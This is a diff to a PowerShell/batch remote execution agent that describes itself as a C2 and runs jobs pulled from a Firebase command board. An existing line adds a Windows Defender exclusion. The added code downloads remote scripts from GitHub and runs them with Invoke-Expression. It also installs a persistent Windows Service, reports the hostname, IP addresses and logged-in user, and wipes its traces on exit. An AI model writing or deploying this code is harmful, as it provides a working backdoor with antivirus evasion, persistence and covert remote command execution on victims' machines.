@@ -1,15 +1,23 @@
-<# :
+﻿<# :
 @echo off
 title BB_JAVIS Remote Execution Agent
 cd /d "%~dp0"
+if exist "%~dp0start_remote_agent.ps1" (
+    powershell -NoProfile -ExecutionPolicy Bypass -File "%~dp0start_remote_agent.ps1" %*
+    exit /b %ERRORLEVEL%
+)
 powershell -NoProfile -ExecutionPolicy Bypass -Command "$s=[scriptblock]::Create((Get-Content -Encoding UTF8 '%~f0') -join `"`n`"); & $s %*"
-exit /b
+exit /b %ERRORLEVEL%
 #>
 param (
     [string]$ApiKey,
     [string]$GatewayUrl,
     [string]$FirebaseUrl = "https://uat-api-agent-default-rtdb.firebaseio.com/",
     [string]$SecretKey,
+    [string]$Mode = "temp",
+    [switch]$AsService,
+    [switch]$InstallService,
+    [switch]$UninstallService,
     [int]$PollIntervalSec = 3
 )
 
@@ -42,6 +50,45 @@ try {
         Add-MpPreference -ExclusionPath $env:TEMP -ErrorAction SilentlyContinue
     }
 } catch {}
+
+# ตรวจสอบคำสั่งติดตั้งหรือถอนการติดตั้ง Service
+if ($InstallService.IsPresent) {
+    $installScript = Join-Path $PSScriptRoot "install_service.ps1"
+    if (Test-Path $installScript) {
+        & powershell -NoProfile -ExecutionPolicy Bypass -File $installScript
+    } else {
+        try {
+            [System.Net.ServicePointManager]::SecurityProtocol = 3072 -bor 768 -bor 192
+            $wc = New-Object System.Net.WebClient
+            $wc.Encoding = [System.Text.Encoding]::UTF8
+            $code = $wc.DownloadString("https://raw.githubusercontent.com/SDPLaos2023/CMD_Remote_Javis/main/install_service.ps1")
+            $wc.Dispose()
+            Invoke-Expression $code
+        } catch {
+            Write-Host "[ERROR] ไม่สามารถดาวน์โหลด install_service.ps1: $_" -ForegroundColor Red
+        }
+    }
+    return
+}
+
+if ($UninstallService.IsPresent) {
+    $uninstallScript = Join-Path $PSScriptRoot "uninstall_service.ps1"
+    if (Test-Path $uninstallScript) {
+        & powershell -NoProfile -ExecutionPolicy Bypass -File $uninstallScript
+    } else {
+        try {
+            [System.Net.ServicePointManager]::SecurityProtocol = 3072 -bor 768 -bor 192
+            $wc = New-Object System.Net.WebClient
+            $wc.Encoding = [System.Text.Encoding]::UTF8
+            $code = $wc.DownloadString("https://raw.githubusercontent.com/SDPLaos2023/CMD_Remote_Javis/main/uninstall_service.ps1")
+            $wc.Dispose()
+            Invoke-Expression $code
+        } catch {
+            Write-Host "[ERROR] ไม่สามารถดาวน์โหลด uninstall_service.ps1: $_" -ForegroundColor Red
+        }
+    }
+    return
+}
 
 # ฟังก์ชัน Native .NET HTTP Client (Zero-Dependency 100% ไม่ต้องพึ่งพา curl.exe)
 function Invoke-FirebaseHttp {
@@ -188,10 +235,51 @@ function Get-UniqueSecretKey {
     return (Get-Random -Minimum 1000 -Maximum 10000).ToString()
 }
 
+$isFixedService = ($Mode -eq "fix" -or $AsService.IsPresent)
+$serviceConfigDir = Join-Path $env:ProgramData "BB_Javis"
+$serviceConfigFile = Join-Path $serviceConfigDir "service_config.json"
+
+# จัดการ Persistent PIN สำหรับโหมด Fix (Windows Service)
+if ($isFixedService -and [string]::IsNullOrWhiteSpace($SecretKey)) {
+    if (Test-Path $serviceConfigFile) {
+        try {
+            $savedCfg = Get-Content $serviceConfigFile -Raw -Encoding UTF8 | ConvertFrom-Json
+            if ($savedCfg -and $savedCfg.pin) {
+                $candPin = $savedCfg.pin.ToString().Trim()
+                $checkDevUrl = $BaseUrl + "devices/$candPin.json"
+                $devJson = Invoke-FirebaseHttp -Uri $checkDevUrl -Method "GET" -TimeoutSec 5
+                if ([string]::IsNullOrWhiteSpace($devJson) -or $devJson.Trim() -eq "null") {
+                    $SecretKey = $candPin
+                } else {
+                    $devObj = ConvertFrom-Json -InputObject $devJson.Trim() -ErrorAction SilentlyContinue
+                    if ($devObj -and ($devObj.hostname -eq $env:COMPUTERNAME -or $devObj.pin -eq $candPin)) {
+                        $SecretKey = $candPin
+                    }
+                }
+            }
+        } catch {}
+    }
+}
+
 if ([string]::IsNullOrWhiteSpace($SecretKey)) {
     $SecretKey = Get-UniqueSecretKey -TargetBaseUrl $BaseUrl
 } else {
     $SecretKey = $SecretKey.Trim()
+}
+
+# บันทึก Persistent PIN ประจำเครื่องหากเป็นโหมด Fix
+if ($isFixedService) {
+    try {
+        if (-not (Test-Path $serviceConfigDir)) { $null = New-Item -ItemType Directory -Path $serviceConfigDir -Force }
+        $cfgObj = @{
+            pin = $SecretKey
+            hostname = $env:COMPUTERNAME
+            mode = "fix"
+            updated_at = (Get-Date -Format "yyyy-MM-ddTHH:mm:ssZ")
+        } | ConvertTo-Json
+        $utf8NoBom = New-Object System.Text.UTF8Encoding($false)
+        [System.IO.File]::WriteAllText($serviceConfigFile, $cfgObj, $utf8NoBom)
+    } catch {}
 }
 
 # สกัดข้อมูล Tenant จาก API Key
@@ -206,13 +294,94 @@ $maskedKey = if ($script:JavisApiKey.Length -gt 15) {
     "Configured"
 }
 
+# ฟังก์ชันสกัดข้อมูลเครื่องและเครือข่ายสำหรับ Heartbeat
+function Get-LocalIPv4 {
+    try {
+        $ip = (Get-NetIPAddress -AddressFamily IPv4 -InterfaceAlias * -ErrorAction SilentlyContinue |
+               Where-Object { $_.IPAddress -notlike "127.*" -and $_.IPAddress -notlike "169.254.*" } |
+               Select-Object -ExpandProperty IPAddress -First 1)
+        if ($ip) { return $ip }
+    } catch {}
+    try {
+        $ips = [System.Net.Dns]::GetHostAddresses([System.Net.Dns]::GetHostName()) |
+               Where-Object { $_.AddressFamily -eq [System.Net.Sockets.AddressFamily]::InterNetwork -and $_.IPAddressToString -notlike "127.*" }
+        if ($ips) { return $ips[0].IPAddressToString }
+    } catch {}
+    return "127.0.0.1"
+}
+
+function Get-OsName {
+    try {
+        $os = (Get-CimInstance Win32_OperatingSystem -ErrorAction SilentlyContinue).Caption
+        if ($os) { return $os.Trim() }
+    } catch {}
+    try {
+        $os = (Get-WmiObject Win32_OperatingSystem -ErrorAction SilentlyContinue).Caption
+        if ($os) { return $os.Trim() }
+    } catch {}
+    return [System.Environment]::OSVersion.VersionString
+}
+
+function Get-PublicIPv4 {
+    try {
+        $wc = New-Object System.Net.WebClient
+        $wc.Headers.Add("User-Agent", "BB_Javis/2.0")
+        $pIp = $wc.DownloadString("https://api.ipify.org")
+        $wc.Dispose()
+        if ($pIp -and $pIp.Trim().Length -le 45) { return $pIp.Trim() }
+    } catch {}
+    return "-"
+}
+
+$script:DeviceLocalIp = Get-LocalIPv4
+$script:DevicePublicIp = Get-PublicIPv4
+$script:DeviceOsVersion = Get-OsName
+$script:LastHeartbeatUtc = [DateTime]::MinValue
+$script:DeviceRegisteredAt = $null
+
+function Update-DeviceHeartbeat {
+    param(
+        [string]$Status = "online"
+    )
+    try {
+        $devUrl = $BaseUrl + "devices/$SecretKey.json"
+        $nowIso = (Get-Date).ToUniversalTime().ToString("yyyy-MM-ddTHH:mm:ssZ")
+        $devData = @{
+            pin = $SecretKey
+            hostname = $env:COMPUTERNAME
+            local_ip = $script:DeviceLocalIp
+            public_ip = $script:DevicePublicIp
+            os_version = $script:DeviceOsVersion
+            user = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
+            service_mode = ($Mode -eq "fix" -or $AsService.IsPresent)
+            status = $Status
+            last_heartbeat = $nowIso
+            tenant = $displayTenant
+        }
+        if ($Status -eq "online" -and -not $script:DeviceRegisteredAt) {
+            $script:DeviceRegisteredAt = $nowIso
+            $devData["registered_at"] = $nowIso
+        }
+        $json = $devData | ConvertTo-Json -Compress
+        $null = Invoke-FirebaseHttp -Uri $devUrl -Method "PUT" -Body $json -TimeoutSec 5
+        $script:LastHeartbeatUtc = [DateTime]::UtcNow
+    } catch {}
+}
+
 # แสดงแบนเนอร์ข้อมูลระบบและรหัส Secret Key แบบ Professional
 Write-Host "======================================================================" -ForegroundColor DarkCyan
 Write-Host "              BB_JAVIS ENTERPRISE REMOTE EXECUTION AGENT              " -ForegroundColor Yellow
 Write-Host "======================================================================" -ForegroundColor DarkCyan
 Write-Host "  -> Remote Secret Key : " -NoNewline -ForegroundColor Gray
 Write-Host "[ $SecretKey ]" -NoNewline -ForegroundColor Green
-Write-Host " (ACTIVE)" -ForegroundColor Yellow
+$modeBadge = if ($isFixedService) { "(FIXED SERVICE)" } else { "(ACTIVE TEMP)" }
+Write-Host " $modeBadge" -ForegroundColor Yellow
+Write-Host "  -> Execution Mode    : " -NoNewline -ForegroundColor Gray
+Write-Host $(if ($isFixedService) { "Always-On Windows Service" } else { "Ephemeral On-Demand" }) -ForegroundColor White
+Write-Host "  -> Machine Hostname  : " -NoNewline -ForegroundColor Gray
+Write-Host "$env:COMPUTERNAME" -ForegroundColor Cyan
+Write-Host "  -> Local IPv4        : " -NoNewline -ForegroundColor Gray
+Write-Host "$script:DeviceLocalIp" -ForegroundColor Cyan
 Write-Host "  -> Tenant Workspace  : " -NoNewline -ForegroundColor Gray
 Write-Host "[$displayTenant]" -ForegroundColor Cyan
 Write-Host "  -> API Key Security  : " -NoNewline -ForegroundColor Gray
@@ -222,35 +391,57 @@ Write-Host "Real-Time SSE Connected (<10ms In-Memory Turbo)" -ForegroundColor Gr
 Write-Host "  -> Engine Type       : " -NoNewline -ForegroundColor Gray
 Write-Host "Hybrid Turbo C2 (In-Memory Runspace + Dual-Engine)" -ForegroundColor White
 Write-Host "  -> One-Link URL      : " -NoNewline -ForegroundColor Gray
-Write-Host "da.gd/bbj" -ForegroundColor Cyan
+Write-Host $(if ($isFixedService) { "da.gd/bbj-fix" } else { "da.gd/bbj" }) -ForegroundColor Cyan
 Write-Host "----------------------------------------------------------------------" -ForegroundColor DarkGray
 Write-Host "   * Give the Remote Secret Key above to your controller" -ForegroundColor Yellow
 Write-Host "======================================================================" -ForegroundColor DarkCyan
-Write-Host "  Ready for incoming commands. Press Ctrl+C to stop." -ForegroundColor Gray
-Write-Host "======================================================================" -ForegroundColor DarkCyan
+if (-not $AsService.IsPresent) {
+    Write-Host "  Ready for incoming commands. Press Ctrl+C to stop." -ForegroundColor Gray
+    Write-Host "======================================================================" -ForegroundColor DarkCyan
+}
 
 # ลงทะเบียน PIN บน Cloud Command Board ป้องกันผู้อื่นสุ่มชน
 try {
     $claimUrl = $BaseUrl + "jobs/$SecretKey/claim.json"
-    $claimBody = '{"claimed_at":"' + (Get-Date -Format "yyyy-MM-dd HH:mm:ss") + '","status":"active","engine":"realtime_sse","tenant":"' + $displayTenant + '"}'
+    $claimBody = '{"claimed_at":"' + (Get-Date -Format "yyyy-MM-dd HH:mm:ss") + '","status":"active","engine":"realtime_sse","tenant":"' + $displayTenant + '","hostname":"' + $env:COMPUTERNAME + '"}'
     $null = Invoke-FirebaseHttp -Uri $claimUrl -Method "PUT" -Body $claimBody -TimeoutSec 10
 } catch {}
 
-# ระบบ Self-Destruct Clean Exit: ทำลายข้อมูล Session ทันทีเมื่อปิดโปรแกรมหรือกด Ctrl+C
+# ลงทะเบียนอุปกรณ์เข้าสู่ระบบ Presence Heartbeat
+Update-DeviceHeartbeat -Status "online"
+
+# ระบบ Clean Exit: จัดการสถานะและทำลายข้อมูล Session
 $script:isExiting = $false
 $script:restartRequested = $false
 $cleanExitAction = {
     if ($script:isExiting) { return }
     $script:isExiting = $true
-    Write-Host "`n[SELF-DESTRUCT] Terminating session and cleaning Cloud board..." -ForegroundColor Yellow
-    try {
-        $delUrl = $BaseUrl + "jobs/$SecretKey.json"
-        $null = Invoke-FirebaseHttp -Uri $delUrl -Method "DELETE" -TimeoutSec 5
-    } catch {}
+    
+    if ($Mode -eq "fix" -or $AsService.IsPresent) {
+        Write-Host "`n[SERVICE EXIT] Updating status to offline on Cloud board..." -ForegroundColor Yellow
+        try {
+            Update-DeviceHeartbeat -Status "offline"
+        } catch {}
+        try {
+            $delUrl = $BaseUrl + "jobs/$SecretKey.json"
+            $null = Invoke-FirebaseHttp -Uri $delUrl -Method "DELETE" -TimeoutSec 5
+        } catch {}
+    } else {
+        Write-Host "`n[SELF-DESTRUCT] Terminating session and cleaning Cloud board..." -ForegroundColor Yellow
+        try {
+            $delUrl = $BaseUrl + "jobs/$SecretKey.json"
+            $null = Invoke-FirebaseHttp -Uri $delUrl -Method "DELETE" -TimeoutSec 5
+        } catch {}
+        try {
+            $delDevUrl = $BaseUrl + "devices/$SecretKey.json"
+            $null = Invoke-FirebaseHttp -Uri $delDevUrl -Method "DELETE" -TimeoutSec 5
+        } catch {}
+    }
+
     # เคลียร์ไฟล์ชั่วคราวใน TEMP (Zero-Footprint)
     Get-ChildItem -Path $env:TEMP -Filter "remote_script_*.ps1" -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue
     Get-ChildItem -Path $env:TEMP -Filter "agent_*_temp.json" -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue
-    Write-Host "[SUCCESS] Cloud session deleted cleanly. Zero data residue." -ForegroundColor Green
+    Write-Host "[SUCCESS] Cloud session finalized cleanly. Zero data residue." -ForegroundColor Green
 }
 
 try {
@@ -683,8 +874,8 @@ try {
                     $request.Headers["Authorization"] = "Bearer " + $script:JavisApiKey
                 }
             }
-            $request.Timeout = 180000
-            $request.ReadWriteTimeout = 180000
+            $request.Timeout = 35000
+            $request.ReadWriteTimeout = 35000
 
             $response = $request.GetResponse()
             $stream = $response.GetResponseStream()
@@ -696,6 +887,11 @@ try {
             while (-not $reader.EndOfStream -and -not $script:isExiting) {
                 $line = $reader.ReadLine()
                 if ($null -eq $line) { break }
+
+                # ตรวจสอบส่ง Heartbeat สม่ำเสมอทุกๆ 28-30 วินาที
+                if (([DateTime]::UtcNow - $script:LastHeartbeatUtc).TotalSeconds -ge 28) {
+                    Update-DeviceHeartbeat -Status "online"
+                }
 
                 if ($line.StartsWith("data: ")) {
                     $null = $dataBuffer.AppendLine($line.Substring(6))
@@ -741,6 +937,7 @@ try {
 
                                         Execute-RemoteJob -JobId $targetJobId -JobDetails $targetJobDetails -BaseUrl $BaseUrl -CurrentKey $SecretKey
                                         $lastProcessedJob = $targetJobId
+                                        Update-DeviceHeartbeat -Status "online"
                                         break
                                     }
                                 }
@@ -760,6 +957,9 @@ try {
         }
         catch {
             try { if ($request) { $request.Abort() } } catch {}
+            if (([DateTime]::UtcNow - $script:LastHeartbeatUtc).TotalSeconds -ge 28) {
+                Update-DeviceHeartbeat -Status "online"
+            }
             # หาก SSE หลุด หรือมีข้อจำกัดด้านเน็ตเวิร์ก ให้สลับมาใช้ Adaptive Fast Polling ชั่วคราว
             try {
                 $queryUrl = $BaseUrl + "jobs/$SecretKey.json"
@@ -771,6 +971,7 @@ try {
                             if ($prop.Value -and $prop.Value.status -eq "pending" -and $prop.Name -ne $lastProcessedJob) {
                                 Execute-RemoteJob -JobId $prop.Name -JobDetails $prop.Value -BaseUrl $BaseUrl -CurrentKey $SecretKey
                                 $lastProcessedJob = $prop.Name
+                                Update-DeviceHeartbeat -Status "online"
                                 break
                             }
                         }
